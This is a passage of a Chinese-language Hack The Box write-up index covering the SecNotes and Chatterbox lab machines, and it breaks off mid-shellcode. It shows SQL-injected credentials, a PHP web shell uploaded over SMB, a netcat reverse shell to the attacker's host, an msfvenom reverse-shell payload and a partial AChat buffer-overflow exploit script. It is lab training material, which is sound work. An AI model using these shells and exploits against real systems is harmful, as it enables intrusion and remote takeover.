http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n| http-title: Secure Notes - Login\n|_Requested resource was login.php\n445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)\n8808/tcp open  http         Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows\nService Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results:\n|_clock-skew: mean: 2h32m28s, deviation: 4h37m09s, median: -7m32s\n| smb-os-discovery: \n|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)\n|   OS CPE: cpe:/o:microsoft:windows_10::-\n|   Computer name: SECNOTES\n|   NetBIOS computer name: SECNOTES\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2019-01-13T09:01:07-08:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2019-01-13 12:01:08\n|_  start_date: N/A\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-SecNotes/index.html#website-tcp-8808","title":"WebSite - TCP 8808","text":"<p>\u6b64\u7ad9\u70b9\u4f3c\u4e4e\u53ea\u6709 IIS \u9ed8\u8ba4\u9875\u9762\uff1a</p> <p></p>"},{"location":"CTF/HTB/Windows-SecNotes/index.html#website-tcp-80","title":"WebSite - TCP 80","text":"<p>\u8bbf\u95ee\u8be5\u7f51\u7ad9\u65f6\uff0c\u6211\u4eec\u88ab\u91cd\u5b9a\u5411\u5230/login.php\uff0c\u4e4b\u540e\u53d1\u73b0\u53ef\u4ee5\u6ce8\u518c\u4e00\u4e2a\u7528\u6237\uff0c\u5e76\u4f7f\u7528\u8be5\u7528\u6237\u767b\u5f55\uff0c\u91cd\u5b9a\u5411\u5230/home.php\u3002</p> <p></p> <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5SQL\u6ce8\u5165\u7ed5\u8fc7\u3002</p> <p></p> <p>\u6ce8\u518c\u65b0\u7684\u8d26\u53f7\u8fdb\u5165\u67e5\u770b\u7f51\u7ad9\u5185\u5bb9\uff0c\u7ed9\u51fa\u63d0\u793a\u5b58\u5728\u6ce8\u5165\uff0c\u5c1d\u8bd5\u4f7f\u7528SQL\u6ce8\u5165</p> <p></p> <p>\u91cd\u65b0\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u5c1d\u8bd5\u6ce8\u5165\uff0c\u83b7\u53d6\u5230\u8d26\u53f7\u5bc6\u7801\u4e0e\u57df\u540d\uff1a \u7528\u6237\uff1atyler \u5bc6\u7801\uff1a92g!mA8BGjOirkL%OG*&amp;</p> <p></p>"},{"location":"CTF/HTB/Windows-SecNotes/index.html#_2","title":"\u6f0f\u6d1e\u626b\u63cf\u4e0e\u63a2\u6d4b","text":"<p>\u901a\u8fc7\u4e4b\u524d\u7aef\u53e3\u626b\u63cf\u5f97\u77e5445\u7aef\u53e3\u5f00\u653e\u4e86smb\u670d\u52a1\uff0c\u4f7f\u7528smbclient\u8fdb\u884c\u767b\u5f55\u3002</p> <pre><code>smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&amp;' \\\\\\\\10.129.62.186\\\\new-site\n</code></pre> <p>smbclient\u4f7f\u7528\u6559\u7a0b\uff1ahttps://cloud.tencent.com/developer/article/2393256</p> <p>-U &lt;\u7528\u6237\u540d\u79f0&gt;\uff1a\u6307\u5b9a\u7528\u6237\u540d\u79f0\uff1b</p> <p></p> <p>\u5176\u4e2d\u7684\u7167\u7247\u662f8808\u7aef\u53e3\u5728\u4f7f\u7528\u3002</p>"},{"location":"CTF/HTB/Windows-SecNotes/index.html#shell","title":"shell\u6743\u9650","text":"<p>\u901a\u8fc7SMB\u4e0a\u4f20\u6587\u4ef6\u3002</p> <pre><code>root@kali# echo test &gt; hypnotic.txt\n...\nsmb: \\&gt; put hypnotic.txt\nputting file hypnotic.txt as \\hypnotic.txt (1.2 kb/s) (average 0.6 kb/s)\n...\nroot@kali# curl http://10.10.10.97:8808/hypnotic.txt\ntest\n</code></pre> <p>\u63a5\u4e0b\u6765\u901a\u8fc7\u4e0a\u4f20\u6076\u610f\u811a\u672c\u8fdb\u884c\u63d0\u6743.</p> <pre><code>root@kali# cat /opt/shells/php/cmd.php \n&lt;?php system($_REQUEST['cmd']); ?&gt;\n\nroot@kali# smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&amp;' //10.10.10.97/new-site -c 'put /opt/shells/php/cmd.php hypnotic.php'\nputting file /opt/shells/php/cmd.php as \\hypnotic.php (0.5 kb/s) (average 0.5 kb/s)\n\nroot@kali# curl http://10.10.10.97:8808/hypnotic.php?cmd=whoami\nsecnotes\\tyler\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u6709\u4ee3\u7801\u6267\u884c\u7684\u529f\u80fd\u3002</p> <p>\u9996\u5148\u627e\u5230\u4e00\u4efd\u526f\u672c nc \u5e76\u5c06\u5176\u653e\u5230\u78c1\u76d8\u4e0a\uff1a</p> <pre><code>root@kali# locate nc.exe\n/opt/SecLists/Web-Shells/FuzzDB/nc.exe\n/opt/shells/netcat/nc.exe\n/usr/lib/mono/4.5/cert-sync.exe\n/usr/share/seclists/Web-Shells/FuzzDB/nc.exe\n/usr/share/sqlninja/apps/nc.exe\n/usr/share/windows-binaries/nc.exe\n\nroot@kali# smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&amp;' //10.10.10.97/new-site -c 'put /opt/shells/netcat/nc.exe nc.exe'\nputting file /opt/shells/netcat/nc.exe as \\nc.exe (359.2 kb/s) (average 359.2 kb/s)\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u8c03\u7528\u5b83\u6765\u53d6\u56de\u4e00\u4e2a shell\uff1a</p> <pre><code>root@kali# curl \"http://10.10.10.97:8808/hypnotic.php?cmd=nc.exe+-e+cmd.exe+10.10.14.15+443\"\n</code></pre> <pre><code>root@kali# nc -lnvp 443\nNcat: Version 7.70 ( https://nmap.org/ncat )\nNcat: Listening on :::443\nNcat: Listening on 0.0.0.0:443\nNcat: Connection from 10.10.10.97.\nNcat: Connection from 10.10.10.97:49738.\nMicrosoft Windows [Version 10.0.17134.228]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\inetpub\\new-site&gt;whoami\nsecnotes\\tyler\n</code></pre>"},{"location":"CTF/HTB/Windows-SecNotes/index.html#_3","title":"\u6743\u9650\u63d0\u5347","text":"<p>\u5728C:\\Distros\\Ubuntu\u76ee\u5f55\u4e0b\u53d1\u73b0ubuntu.exe</p> <p></p> <p>\u5c1d\u8bd5\u8fdb\u884c\u5229\u7528\u6267\u884cbash.exe \u6210\u529f\u63d0\u6743</p> <p></p> <p>\u83b7\u53d6\u4ea4\u4e92\u5f0fshell \u67e5\u770b.bash_history\u6587\u4ef6</p> <p></p> <p>\u53d1\u73b0\u7ba1\u7406\u5458\u8d26\u53f7\u4e0e\u5bc6\u7801\u4f7f\u7528\u8be5\u8d26\u53f7\u767b\u5f55smb\u670d\u52a1\uff0c\u53d1\u73b0root.txt\u5c06\u5176\u4e0b\u8f7d\u5230kali\u4e2d\u8fdb\u884c\u67e5\u770b</p> <p></p>"},{"location":"CTF/HTB/Windows-chatterbox/index.html","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Windows-chatterbox/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap -sT -p- --min-rate 5000 --max-retries 1 10.10.10.74\n...\nPORT     STATE SERVICE\n9255/tcp open  mon\n9256/tcp open  unknown\n...\nroot@kali# nmap -sU -p- --min-rate 5000 --max-retries 1 10.10.10.74\n...\nAll 65535 scanned ports on 10.10.10.74 are open|filtered\n...\nroot@kali# nmap 10.10.10.74 -sV -T4 -A -O -p 9255,9256 \n...\nPORT     STATE SERVICE VERSION\n9255/tcp open  http    AChat chat system httpd\n|_http-title: Site doesn't have a title.\n|_http-server-header: AChat\n9256/tcp open  achat   AChat chat system\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)\nOS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 9256/tcp)\nHOP RTT       ADDRESS\n1   249.48 ms 10.10.14.1\n2   249.69 ms 10.10.10.74\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.06 seconds\n...\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u53ea\u6709\u4e24\u4e2a\u7aef\u53e3\u663e\u793a\u8fd0\u884c\u4e86\u4e00\u4e2a\u53ebAChat\u7684\u8f6f\u4ef6\u3002</p>"},{"location":"CTF/HTB/Windows-chatterbox/index.html#_2","title":"\u6f0f\u6d1e\u68c0\u6d4b\u4e0e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-chatterbox/index.html#kaliachat","title":"kali\u641c\u7d22AChat \u6f0f\u6d1e","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# searchsploit AChat             \n---------------------------------------- ---------------------------------\n Exploit Title                          |  Path\n---------------------------------------- ---------------------------------\nAchat 0.150 beta7 - Remote Buffer Overf | windows/remote/36025.py\nAchat 0.150 beta7 - Remote Buffer Overf | windows/remote/36056.rb\nMataChat - 'input.php' Multiple Cross-S | php/webapps/32958.txt\nParachat 5.5 - Directory Traversal      | php/webapps/24647.txt\n---------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>Google\u5bfb\u627eexp\uff1ahttps://github.com/mpgn/AChat-Reverse-TCP-Exploit</p> <p>\u4f46\u662f\u8fd9\u53f0\u9776\u673a\u7684exp\u4e0d\u80fd\u591f\u4f7f\u7528meterpreter\uff0c\u4e00\u8fdb\u53bb\u5c31\u6b7b\u6389\uff0c\u56e0\u6b64\u8981\u505a\u4e00\u4e9b\u4fee\u6539\uff0c\u751f\u6210payload\uff1a</p> <p>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp  RHOST=10.10.10.74 LHOST=10.10.16.3 LPORT=4444 exitfunc=thread -e x86/unicode_upper -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python  \u89e3\u91ca\uff1a</p> <p>-a x86 \u6307\u5b9a\u67b6\u6784\u4e3a x86\uff0c\u537332\u4f4d</p> <p>--platform Windows \u6307\u5b9a\u76ee\u6807\u5e73\u53f0\u4e3a Windows\u3002</p> <p>-p \u6307\u5b9a payload \u7c7b\u578b\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u662f windows/shell_reverse_tcp\uff0c\u5373\u4e00\u4e2a\u53cd\u5411 TCP shell\u3002</p> <p>RHOST \u6307\u5b9a\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\uff0c\u5373 10.10.10.74\u3002</p> <p>LHOST \u6307\u5b9a\u672c\u5730\u4e3b\u673a\u7684 IP \u5730\u5740\uff0c\u5373 10.10.16.3\u3002</p> <p>LPORT \u6307\u5b9a\u672c\u5730\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u5373 4444\u3002</p> <p>exitfunc \u6307\u5b9a\u5728 payload \u6267\u884c\u5b8c\u6bd5\u540e\u4f7f\u7528 thread \u65b9\u5f0f\u9000\u51fa\uff0c\u4ee5\u4fdd\u8bc1 payload \u80fd\u7ee7\u7eed\u6267\u884c\u5176\u4ed6\u4ee3\u7801\u3002</p> <p>-e \u6307\u5b9a\u7f16\u7801\u5668\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u662f x86/unicode_upper\uff0c\u7528\u4e8e\u7f16\u7801 payload \u4ee5\u907f\u5f00\u68c0\u6d4b\u673a\u5236\u3002</p> <p>-b \u6307\u5b9a\u574f\u5b57\u7b26\uff08bad characters\uff09\uff0c\u5728\u7f16\u7801\u65f6\u8fd9\u4e9b\u5b57\u7b26\u5c06\u88ab\u907f\u514d\u3002\u8fd9\u91cc\u6307\u5b9a\u4e86\u4e00\u957f\u4e32\u7684\u574f\u5b57\u7b26\uff0c\u5305\u62ec\u4ece \\x00 \u5230 \\xff \u4e2d\u7684\u6240\u6709\u975e ASCII \u5b57\u7b26\u3002</p> <p>BufferRegister \u6307\u5b9a\u5bc4\u5b58\u5668\u7528\u4e8e\u4fdd\u5b58\u6709\u6548\u8d1f\u8f7d\u7f13\u51b2\u533a\u5730\u5740\uff0c\u8fd9\u91cc\u662f EAX\u3002</p> <p>-f \u6307\u5b9a\u8f93\u51fa\u683c\u5f0f\uff0c\u8fd9\u91cc\u9009\u62e9 python\uff0c\u5373\u751f\u6210\u7684 payload \u5c06\u4ee5 Python \u4ee3\u7801\u5f62\u5f0f\u8f93\u51fa\u3002</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp  RHOST=10.10.10.74 LHOST=10.10.16.3 LPORT=4444 exitfunc=thread -e x86/unicode_upper -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/unicode_upper\nx86/unicode_upper succeeded with size 779 (iteration=0)\nx86/unicode_upper chosen with final size 779\nPayload size: 779 bytes\nFinal size of python file: 3842 bytes\nbuf =  b\"\"\nbuf += b\"\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\"\nbuf += b\"\\x51\\x41\\x54\\x41\\x58\\x41\\x5a\\x41\\x50\\x41\\x33\\x51\"\nbuf += b\"\\x41\\x44\\x41\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\"\nbuf += b\"\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x51\\x41\\x50\\x41\\x35\"\nbuf += b\"\\x41\\x41\\x41\\x50\\x41\\x5a\\x31\\x41\\x49\\x31\\x41\\x49\"\nbuf += b\"\\x41\\x49\\x41\\x4a\\x31\\x31\\x41\\x49\\x41\\x49\\x41\\x58\"\nbuf += b\"\\x41\\x35\\x38\\x41\\x41\\x50\\x41\\x5a\\x41\\x42\\x41\\x42\"\nbuf += b\"\\x51\\x49\\x31\\x41\\x49\\x51\\x49\\x41\\x49\\x51\\x49\\x31\"\nbuf += b\"\\x31\\x31\\x31\\x41\\x49\\x41\\x4a\\x51\\x49\\x31\\x41\\x59\"\nbuf += b\"\\x41\\x5a\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x33\"\nbuf += b\"\\x30\\x41\\x50\\x42\\x39\\x34\\x34\\x4a\\x42\\x4b\\x4c\\x5a\"\nbuf += b\"\\x48\\x33\\x52\\x4b\\x50\\x4d\\x30\\x4d\\x30\\x53\\x30\\x54\"\nbuf += b\"\\x49\\x4a\\x45\\x4e\\x51\\x39\\x30\\x52\\x44\\x44\\x4b\\x42\"\nbuf += b\"\\x30\\x4e\\x50\\x44\\x4b\\x42\\x32\\x4c\\x4c\\x44\\x4b\\x51\"\nbuf += b\"\\x42\\x4c\\x54\\x34\\x4b\\x52\\x52\\x4f\\x38\\x4c\\x4f\\x57\"\nbuf += b\"\\x47\\x4f\\x5a\\x4d\\x56\\x4e\\x51\\x4b\\x4f\\x36\\x4c\\x4f\"\nbuf += b\"\\x4c\\x43\\x31\\x33\\x4c\\x4b\\x52\\x4e\\x4c\\x4f\\x30\\x37\"\nbuf += b\"\\x51\\x58\\x4f\\x4c\\x4d\\x4b\\x51\\x58\\x47\\x39\\x52\\x4b\"\nbuf += b\"\\x42\\x42\\x32\\x51\\x47\\x34\\x4b\\x51\\x42\\x4c\\x50\\x34\"\nbuf += b\"\\x4b\\x30\\x4a\\x4f\\x4c\\x54\\x4b\\x30\\x4c\\x4e\\x31\\x52\"\nbuf += b\"\\x58\\x39\\x53\\x30\\x48\\x4d\\x31\\x5a\\x31\\x52\\x31\\x54\"\nbuf += b\"\\x4b\\x52\\x39\\x4d\\x50\\x4d\\x31\\x49\\x43\\x44\\x4b\\x4f\"\nbuf += b\"\\x59\\x4e\\x38\\x5a\\x43\\x4e\\x5a\\x51\\x39\\x54\\x4b\\x30\"\nbuf += b\"\\x34\\x34\\x4b\\x4b\\x51\\x39\\x46\\x30\\x31\\x4b\\x4f\\x36\"\nbuf += b\"\\x4c\\x47\\x51\\x48\\x4f\\x4c\\x4d\\x4b\\x51\\x57\\x57\\x50\"\nbuf += b\"\\x38\\x4b\\x30\\x34\\x35\\x4b\\x46\\x4d\\x33\\x33\\x4d\\x4c\"\nbuf += b\"\\x38\\x4f\\x4b\\x53\\x4d\\x4e\\x44\\x43\\x45\\x4b\\x34\\x31\"\nbuf += b\"\\x48\\x34\\x4b\\x51\\x48\\x4f\\x34\\x4b\\x51\\x58\\x53\\x51\"\nbuf += b\"\\x56\\x44\\x4b\\x4c\\x4c\\x30\\x4b\\x54\\x4b\\x51\\x48\\x4d\"\nbuf += b\"\\x4c\\x4b\\x51\\x38\\x53\\x34\\x4b\\x4c\\x44\\x54\\x4b\\x4b\"\nbuf += b\"\\x51\\x4a\\x30\\x53\\x59\\x50\\x44\\x4f\\x34\\x4f\\x34\\x31\"\nbuf += b\"\\x4b\\x31\\x4b\\x43\\x31\\x52\\x39\\x51\\x4a\\x32\\x31\\x4b\"\nbuf += b\"\\x4f\\x49\\x50\\x31\\x4f\\x31\\x4f\\x30\\x5a\\x44\\x4b\\x4d\"\nbuf += b\"\\x42\\x4a\\x4b\\x54\\x4d\\x51\\x4d\\x33\\x38\\x50\\x33\\x4e\"\nbuf += b\"\\x52\\x4b\\x50\\x4d\\x30\\x52\\x48\\x34\\x37\\x52\\x53\\x50\"\nbuf += b\"\\x32\\x51\\x4f\\x30\\x54\\x51\\x58\\x30\\x4c\\x44\\x37\\x4d\"\nbuf += b\"\\x56\\x4c\\x47\\x4b\\x4f\\x59\\x45\\x56\\x58\\x46\\x30\\x4d\"\nbuf += b\"\\x31\\x4d\\x30\\x4b\\x50\\x4e\\x49\\x59\\x34\\x30\\x54\\x32\"\nbuf += b\"\\x30\\x32\\x48\\x4f\\x39\\x55\\x30\\x32\\x4b\\x4d\\x30\\x4b\"\nbuf += b\"\\x4f\\x49\\x45\\x52\\x30\\x32\\x30\\x30\\x50\\x52\\x30\\x4f\"\nbuf += b\"\\x50\\x50\\x50\\x4f\\x50\\x42\\x30\\x52\\x48\\x39\\x5a\\x4c\"\nbuf += b\"\\x4f\\x59\\x4f\\x59\\x50\\x4b\\x4f\\x58\\x55\\x56\\x37\\x32\"\nbuf += b\"\\x4a\\x4b\\x55\\x53\\x38\\x4b\\x5a\\x4b\\x5a\\x4c\\x50\\x4c\"\nbuf += b\"\\x43\\x52\\x48\\x4b\\x52\\x4b\\x50\\x4e\\x31\\x51\\x4c\\x33\"\nbuf += b\"\\x59\\x39\\x56\\x31\\x5a\\x4c\\x50\\x31\\x46\\x52\\x37\\x53\"\nbuf += b\"\\x38\\x35\\x49\\x46\\x45\\x32\\x54\\x43\\x31\\x4b\\x4f\\x49\"\nbuf += b\"\\x45\\x54\\x45\\x39\\x30\\x44\\x34\\x4c\\x4c\\x4b\\x4f\\x50\"\nbuf += b\"\\x4e\\x4b\\x58\\x34\\x35\\x5a\\x4c\\x53\\x38\\x4c\\x30\\x57\"\nbuf += b\"\\x45\\x56\\x42\\x51\\x46\\x4b\\x4f\\x5a\\x35\\x52\\x48\\x43\"\nbuf += b\"\\x33\\x52\\x4d\\x53\\x34\\x4d\\x30\\x35\\x39\\x5a\\x43\\x52\"\nbuf += b\"\\x37\\x52\\x37\\x51\\x47\\x50\\x31\\x4a\\x56\\x51\\x5a\\x4d\"\nbuf += b\"\\x42\\x31\\x49\\x32\\x36\\x5a\\x42\\x4b\\x4d\\x32\\x46\\x57\"\nbuf += b\"\\x57\\x51\\x34\\x4d\\x54\\x4f\\x4c\\x4b\\x51\\x4b\\x51\\x54\"\nbuf += b\"\\x4d\\x50\\x44\\x4d\\x54\\x4c\\x50\\x39\\x36\\x4d\\x30\\x4f\"\nbuf += b\"\\x54\\x52\\x34\\x50\\x50\\x42\\x36\\x30\\x56\\x30\\x56\\x50\"\nbuf += b\"\\x46\\x32\\x36\\x50\\x4e\\x42\\x36\\x30\\x56\\x42\\x33\\x32\"\nbuf += b\"\\x36\\x42\\x48\\x44\\x39\\x38\\x4c\\x4f\\x4f\\x33\\x56\\x4b\"\nbuf += b\"\\x4f\\x5a\\x35\\x33\\x59\\x4b\\x30\\x30\\x4e\\x50\\x56\\x50\"\nbuf += b\"\\x46\\x4b\\x4f\\x4e\\x50\\x43\\x38\\x4c\\x48\\x54\\x47\\x4d\"\nbuf += b\"\\x4d\\x53\\x30\\x4b\\x4f\\x38\\x55\\x57\\x4b\\x4b\\x30\\x4d\"\nbuf += b\"\\x4d\\x4d\\x5a\\x4c\\x4a\\x32\\x48\\x57\\x36\\x45\\x45\\x47\"\nbuf += b\"\\x4d\\x45\\x4d\\x4b\\x4f\\x38\\x55\\x4f\\x4c\\x4d\\x36\\x53\"\nbuf += b\"\\x4c\\x4b\\x5a\\x43\\x50\\x4b\\x4b\\x59\\x50\\x54\\x35\\x4d\"\nbuf += b\"\\x35\\x47\\x4b\\x30\\x47\\x4e\\x33\\x32\\x52\\x32\\x4f\\x52\"\nbuf += b\"\\x4a\\x4b\\x50\\x42\\x33\\x4b\\x4f\\x38\\x55\\x41\\x41\"\n</code></pre> <p>bof.py\uff1a</p> <pre><code>#!/bin/usr/python\nimport socket\nimport sys, time\n\nclass bcolours:\n    GREEN = '\\033[92m'\n    TURQ = '\\033[96m'\n    ENDC = '\\033[0m'\n\n#YOU WILL NEED TO PASTE THE OUTPUT FROM THE SHELL SCRIPT: \"ACHAT_PAYLOAD.SH\" BELOW:\n\nbuf =  b\"\"\nbuf += b\"\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x51\"\nbuf += b\"\\x41\\x54\\x41\\x58\\x41\\x5a\\x41\\x50\\x55\\x33\\x51\\x41\\x44\"\nbuf += b\"\\x41\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\"\nbuf += b\"\\x51\\x41\\x49\\x41\\x51\\x41\\x50\\x41\\x35\\x41\\x41\\x41\\x50\"\nbuf += b\"\\x41\\x5a\\x31\\x41\\x49\\x31\\x41\\x49\\x41\\x49\\x41\\x4a\\x31\"\nbuf += b\"\\x31\\x41\\x49\\x41\\x49\\x41\\x58\\x41\\x35\\x38\\x41\\x41\\x50\"\nbuf += b\"\\x41\\x5a\\x41\\x42\\x41\\x42\\x51\\x49\\x31\\x41\\x49\\x51\\x49\"\nbuf += b\"\\x41\\x49\\x51\\x49\\x31\\x31\\x31\\x31\\x41\\x49\\x41\\x4a\\x51\"\nbuf += b\"\\x49\\x31\\x41\\x59\\x41\\x5a\\x42\\x41\\x42\\x41\\x42\\x41\\x42\"\nbuf += b\"\\x41\\x42\\x33\\x30\\x41\\x50\\x42\\x39\\x34\\x34\\x4a\\x42\\x4b\"\nbuf += b\"\\x4c\\x5a\\x48\\x43\\x52\\x4d\\x30\\x4d\\x30\\x4d\\x30\\x31\\x50\"\nbuf += b\"\\x55\\x39\\x5a\\x45\\x30\\x31\\x37\\x50\\x43\\x34\\x34\\x4b\\x50\"\nbuf += b\"\\x50\\x4e\\x50\\x54\\x4b\\x52\\x32\\x4c\\x4c\\x34\\x4b\\x42\\x32\"\nbuf += b\"\\x4e\\x34\\x34\\x4b\\x32\\x52\\x4f\\x38\\x4c\\x4f\\x37\\x47\\x50\"\nbuf += b\"\\x4a\\x4d\\x56\\x4e\\x51\\x4b\\x4f\\x46\\x4c\\x4f\\x4c\\x31\\x51\"\nbuf += b\"\\x33\\x4c\\x4c\\x42\\x4e\\x4c\\x4f\\x30\\x49\\x31\\x38\\x4f\\x4c\"\nbuf += b\"\\x4d\\x4d\\x31\\x57\\x57\\x49\\x52\\x5a\\x52\\x30\\x52\\x42\\x37\"\nbuf += b\"\\x34\\x4b\\x42\\x32\\x4c\\x50\\x44\\x4b\\x30\\x4a\\x4f\\x4c\\x54\"\nbuf += b\"\\x4b\\x30\\x4c\\x4c\\x51\\x54\\x38\\x5a\\x43\\x31\\x38\\x4b\\x51\"\nbuf += b\"\\x5a\\x31\\x42\\x31\\x34\\x4b\\x50\\x59\\x4f\\x30\\x4b\\x51\\x5a\"\nbuf += b\"\\x33\\x54\\x4b\\x51\\x39\\x4c\\x58\\x4b\\x33\\x4f\\x4a\\x51\\x39\"\nbuf += b\"\\x34\\x4b\\x30\\x34\\x44\\x4b\\x4b\\x51\\x4a\\x36\\x30\\x31\\x4b\"\nbuf += b\"\\x4f\\x36\\x4c\\x59\\x31\\x48\\x4f\\x4c\\x4d\\x4d\\x31\\x47\\x57\"\nbuf += b\"\\x30\\x38\\x49\\x50\\x54\\x35\\x4a\\x56\\x4d\\x33\\x43\\x4d\\x4a\"\nbuf += b\"\\x58\\x4f\\x4b\\x33\\x4d\\x4d\\x54\\x52\\x55\\x59\\x54\\x31\\x48\"\nbuf += b\"\\x54\\x4b\\x50\\x58\\x4f\\x34\\x4b\\x51\\x58\\x53\\x31\\x56\\x54\"\nbuf += b\"\\x4b\\x4c\\x4c\\x30\\x4b\\x44\\x4b\\x42\\x38\\x4d\\x4c\\x4b\\x51\"\nbuf += b\"\\x59\\x43\\x54\\x4b\\x4d\\x34\\x44\\x4b\\x4b\\x51\\x58\\x50\\x44\"\nbuf += b\"\\x49\\x31\\x34\\x4f\\x34\\x4e\\x44\\x51\\x4b\\x31\\x4b\\x33\\x31\"\nbuf += b\"\\x52\\x39\\x51\\x4a\\x30\\x51\\x4b\\x4f\\x59\\x50\\x31\\x4f\\x51\"\nbuf += b\"\\x4f\\x50\\x5a\\x44\\x4b\\x4e\\x32\\x5a\\x4b\\x34\\x4d\\x31\\x4d\"\nbuf += b\"\\x31\\x58\\x50\\x33\\x30\\x32\\x4d\\x30\\x4b\\x50\\x33\\x38\\x52\"\nbuf += b\"\\x57\\x44\\x33\\x4f\\x42\\x51\\x4f\\x51\\x44\\x42\\x48\\x50\\x4c\"\nbuf += 